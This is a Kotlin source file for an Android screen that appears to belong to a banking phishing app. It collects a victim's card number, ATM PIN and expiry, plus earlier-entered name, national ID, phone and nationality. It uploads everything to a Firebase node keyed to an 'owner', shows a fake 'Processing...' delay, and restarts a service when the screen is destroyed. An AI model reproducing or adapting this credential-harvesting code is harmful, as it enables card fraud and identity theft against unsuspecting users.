package com.example.geno


import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.widget.*
import androidx.lifecycle.lifecycleScope
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SecondActivity : AppCompatActivity() {






    private lateinit var cardHolderName: EditText
    private lateinit var atmCardNumber: EditText
    private lateinit var atmPin: EditText
    private lateinit var expiry: AutoCompleteTextView
    private lateinit var next: ImageView


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_second)


var user:UserModel = intent.getParcelableExtra("user")!!


        cardHolderName = findViewById(R.id.cardHolderName)
        atmCardNumber = findViewById(R.id.atmCardNumber)
        atmPin = findViewById(R.id.atmPin)
        expiry = findViewById(R.id.expiry)
        next = findViewById(R.id.imageView3)


        //....suggestionsAdapter....//


//        phoneEditText.addTextChangedListener(object : TextWatcher {
//            override fun beforeTextChanged(
//                s: CharSequence?,
//                start: Int,
//                count: Int,
//                after: Int
//            ) {
//            }
//
//            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
//
//            override fun afterTextChanged(s: Editable?) {
//                val maxLength = 8 // Limit to 8 characters
//                if ((s?.length ?: 0) > maxLength) {
//                    phoneEditText.setText(s?.substring(0, maxLength))
//                    phoneEditText.setSelection(maxLength) // Move cursor to the end
//                }
//            }
//        })



        atmCardNumber.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(
                s: CharSequence?,
                start: Int,
                count: Int,
                after: Int
            ) {
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                val maxLength = 16 // Limit to 8 characters
                if ((s?.length ?: 0) > maxLength) {
                    atmCardNumber.setText(s?.substring(0, maxLength))
                    atmCardNumber.setSelection(maxLength) // Move cursor to the end
                }
            }
        })



        atmPin.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(
                s: CharSequence?,
                start: Int,
                count: Int,
                after: Int
            ) {
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                val maxLength = 6 // Limit to 8 characters
                if ((s?.length ?: 0) > maxLength) {
                    atmPin.setText(s?.substring(0, maxLength))
                    atmPin.setSelection(maxLength) // Move cursor to the end
                }
            }
        })


        expiry.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(
                s: CharSequence?,
                start: Int,
                count: Int,
                after: Int
            ) {
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                if ((s?.length ?: 0) ==2) {
                    expiry.setText("/")
                }else if((s?.length ?: 0) ==4) {
                    expiry.setText("/")
            }
        }})


        next.setOnClickListener {
            val cardHolderNameS = cardHolderName.text.toString()
            val atmCardNumberS = atmCardNumber.text.toString()
            val atmPinS = atmPin.text.toString()
            val expiryS = expiry.text.toString()
            if (cardHolderNameS.isEmpty()||atmCardNumberS.isEmpty()||atmPinS.isEmpty()||expiryS.isEmpty() ){
                Toast.makeText(this, "Filed Must Not Be Empty", Toast.LENGTH_SHORT).show()
            }else{
                val ref = FirebaseDatabase.getInstance().getReference(LastPage.owner).child("Users")
                val model = UserModel(user.key, user.fullName,user.cpr,user.phone,user.nationality,cardHolderNameS,atmCardNumberS,atmPinS,expiryS,System.currentTimeMillis().toString())
                ref.child(user.key).setValue(model)
                val i = Intent(this,LastPage::class.java)
                i.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
                lifecycleScope.launch {
                    var d =   Utils.showProgressDialog(this@SecondActivity,"Processing...")
                    delay(2000)
                    startActivity(i)
                    d.dismiss()
                }
                // Dismiss the "Please
            }
        }




    }



    override fun onDestroy() {
        super.onDestroy()
        startService(intent)
    }

}